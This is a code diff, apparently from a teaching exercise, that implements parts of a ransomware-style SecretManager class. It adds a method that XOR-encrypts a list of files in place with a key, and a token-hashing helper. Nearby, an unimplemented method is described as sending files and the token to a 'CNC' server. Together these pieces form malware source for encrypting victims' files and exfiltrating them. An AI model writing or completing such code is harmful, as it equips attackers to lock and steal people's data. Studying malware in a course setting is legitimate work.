@@ -103,13 +103,23 @@ class SecretManager:
         # If the key is valid, set the self._key var for decrypting
         raise NotImplemented()
 
-    def get_hex_token(self)->str:
-        # Should return a string composed of hex symbole, regarding the token
-        raise NotImplemented()
+    def get_hex_token(self) -> str:
+        # Hacher le token avec SHA-256
+        hashed_token = sha256(self._token).digest()
 
-    def xorfiles(self, files:List[str])->None:
-        # xor a list for file
-        raise NotImplemented()
+        # Convertir le token haché en représentation hexadécimale
+        hex_token = hashed_token.hex()
+
+        return hex_token
+    
+    def xorfiles(self, files: List[str]) -> None:
+        # Chiffrer chaque fichier de la liste avec la clé self._key
+        for file_path in files:
+            try:
+                xorfile(file_path, file_path, self._key)
+                self._log.info(f"Encrypted file: {file_path}")
+            except Exception as e:
+                self._log.error(f"Error encrypting file {file_path}: {e}")
 
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
